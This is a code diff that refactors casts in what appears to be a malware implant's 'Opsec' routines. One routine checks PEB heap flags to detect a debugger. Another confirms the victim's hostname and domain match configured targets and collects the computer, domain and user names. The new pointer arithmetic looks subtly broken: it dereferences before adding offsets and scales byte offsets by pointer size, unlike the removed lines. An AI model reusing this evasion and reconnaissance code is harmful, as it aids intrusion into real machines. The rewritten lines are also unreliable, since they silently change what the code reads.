@@ -51,12 +51,12 @@ namespace Opsec {
         flags_offset 		= vista_or_greater ? 0x40 : 0x0C;
         force_flags_offset 	= vista_or_greater ? 0x44 : 0x10;
 #else
-        heap_base           = C_PTR(*R_CAST(ULONG_PTR*, R_CAST(PBYTE, peb) + 0x30));
+        heap_base           = C_PTR(*(ULONG_PTR*) B_PTR(peb) + 0x30);
         flags_offset        = vista_or_greater ? 0x70 : 0x14;
         force_flags_offset  = vista_or_greater ? 0x74 : 0x18;
 #endif
-        auto HeapFlags      = R_CAST(ULONG_PTR*, S_CAST(PBYTE, heap_base) + flags_offset);
-        auto HeapForceFlags = R_CAST(ULONG_PTR*, S_CAST(PBYTE, heap_base) + force_flags_offset);
+        auto HeapFlags      = (ULONG_PTR*) B_PTR(heap_base) + flags_offset;
+        auto HeapForceFlags = (ULONG_PTR*) B_PTR(heap_base) + force_flags_offset;
 
         return ((*HeapFlags & ~HEAP_GROWABLE) || (*HeapForceFlags != 0));
     }
@@ -81,7 +81,7 @@ namespace Opsec {
         char            buffer[MAX_PATH]    = { };
         bool            success             = true;
 
-        if (Ctx->win32.GetComputerNameExA(ComputerNameNetBIOS, S_CAST(LPSTR, buffer), &length)) {
+        if (Ctx->win32.GetComputerNameExA(ComputerNameNetBIOS, (LPSTR) buffer, &length)) {
             x_assertb(x_strncmp(Ctx->config.hostname, buffer, x_strlen(Ctx->config.hostname)) == 0);
             Stream::PackString(out, buffer);
         }
@@ -93,7 +93,7 @@ namespace Opsec {
         length = MAX_PATH;
 
         if (Ctx->transport.domain[0]) {
-            if (Ctx->win32.GetComputerNameExA(ComputerNameDnsDomain, S_CAST(LPSTR, buffer), &length)) {
+            if (Ctx->win32.GetComputerNameExA(ComputerNameDnsDomain, (LPSTR) buffer, &length)) {
                 x_assertb(x_strncmp(Ctx->transport.domain, buffer, x_strlen(Ctx->transport.domain)) == 0);
                 Stream::PackString(out, buffer);
             }
@@ -105,7 +105,7 @@ namespace Opsec {
         x_memset(buffer, 0, MAX_PATH);
         length = MAX_PATH;
 
-        if (Ctx->win32.GetUserNameA(S_CAST(LPSTR, buffer), &length)) {
+        if (Ctx->win32.GetUserNameA((LPSTR) buffer, &length)) {
             Stream::PackString(out, buffer);
         }
         else {
